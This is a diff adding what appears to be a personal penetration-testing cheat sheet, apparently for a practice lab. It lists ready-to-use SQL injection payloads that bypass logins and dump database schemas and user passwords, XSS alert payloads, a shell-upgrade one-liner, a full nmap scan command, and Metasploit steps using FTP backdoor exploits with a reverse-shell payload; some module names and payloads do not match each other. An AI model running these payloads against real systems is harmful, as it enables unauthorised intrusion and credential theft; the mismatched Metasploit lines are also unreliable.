@@ -1,0 +1,50 @@
+SQL 
+
+'or '1'='1 
+
+') or 1=('1 
+
+or 1=1;#
+
+=Heywood%27+ORDER+BY+4+LIMIT+1;%23
+
+=Heywood%27+UNION+SELECT+@@version,NULL,NULL,NULL+FROM+users+LIMIT+1,1;%23 
+
+=Heywood%27+UNION+SELECT+@@version,null,GROUP_CONCAT(0x7c,schema_name,0x7c),NULL+FROM+information_schema.schemata+LIMIT+1,1;%23 
+
+Heywood%27+UNION+SELECT+NULL,NULL,GROUP_CONCAT(0x7c,column_name,0x7c),NULL+FROM+information_schema.columns+WHERE+table_name='users'+AND+table_schema='samurai'+LIMIT+1,1;%23 
+
+Heywood%27+UNION+SELECT+NULL,NULL,GROUP_CONCAT(0x7c,id,0x7c,password,0x7c,username,0x7c),NULL+FROM+samurai.users+LIMIT+1,1;%23
+
+
+XSS
+
+<img src="jj" onerror=alert('xss')>
+
+<script>alert(1)</script>
+
+
+PRIVESC : 
+https://systemweakness.com/linux-privilege-escalation-using-path-variable-manipulation-64325ab05469
+
+
+amiliorer shell 
+
+python -c 'import pty;pty.spawn("/bin/bash")'
+
+
+nmap
+1 nmap -sV -sC -O -p- 192.168.56.210 -oN full.nmap
+
+
+
+
+
+metasploit
+
+msfconsole
+search proftp
+use exploit/unix/ftp/proftpd_133c_backdoor
+show playloads 
+set payload windows/meterpreter/reverse_tcp
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions
